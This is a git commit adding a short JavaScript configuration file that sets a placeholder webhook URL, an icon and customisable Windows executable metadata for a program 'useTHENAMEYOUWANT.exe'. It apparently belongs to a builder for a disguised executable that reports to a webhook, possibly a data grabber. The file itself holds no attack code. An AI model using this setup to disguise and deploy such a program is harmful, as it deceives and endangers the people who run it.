36ecc972b1f81020fbbc6aef90ad33aa62eaab1d
Skullezz <150681052+Skullezz@users.noreply.github.com>
2023-11-13 15:23:47 +0200

    Add files via upload

---
+++ OPEN ME WITH NOTEPAD.js
@@ -0,0 +1,12 @@
+module.exports = () => {
+    return {
+        webhook_url: "ENTER_YOUR_WEBHOOK",
+        icon: './default.ico',
+        properties: {
+            FileDescription: 'useTHENAMEYOUWANT',
+            ProductName: 'useTHENAMEYOUWANT',
+            LegalCopyright: 'useTHENAMEYOUWANT ©️ 2023',
+            OriginalFilename: 'useTHENAMEYOUWANT.exe'
+        }
+    }
+}
